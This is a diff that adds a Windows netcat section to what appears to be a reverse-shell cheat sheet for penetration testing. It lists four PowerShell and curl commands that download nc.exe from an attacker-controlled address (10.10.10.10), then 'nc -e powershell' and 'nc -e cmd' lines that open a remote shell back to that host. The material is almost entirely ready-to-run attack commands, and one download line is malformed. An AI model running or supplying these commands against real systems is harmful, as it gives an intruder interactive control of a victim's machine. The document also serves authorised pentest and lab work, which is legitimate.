@@ -120,6 +120,30 @@ xterm -display [IP]:1
 ---
 
 ## Windows
+**Netcat**
+
+Download nc (e.g. hosted via `python -m SimpleHTTPServer 80` within /usr/share/windows-binaries)
+```powershell
+powershell Invoke-WebRequest -Uri 'http://10.10.10.10/nc.exe' -OutFile 'nc.exe'
+```
+```powershell
+powershell (New-Object Net.WebClient).DownloadString('http://10.10.10.10/nc.exe', 'nc.exe')
+```
+```powershell
+powershell Start-BitsTransfer -Source 'http://10.10.10.10/nc.exe' -Destination 'nc.exe'
+```
+```powershell
+curl -o nc.exe http://10.10.10.10/nc.exe
+```
+
+Execute
+```powershell
+nc -e powershell 10.10.10.10 9999
+```
+```powershell
+nc -e cmd 10.10.10.10 9999
+```
+
 **Perl**
 
 ```powershell
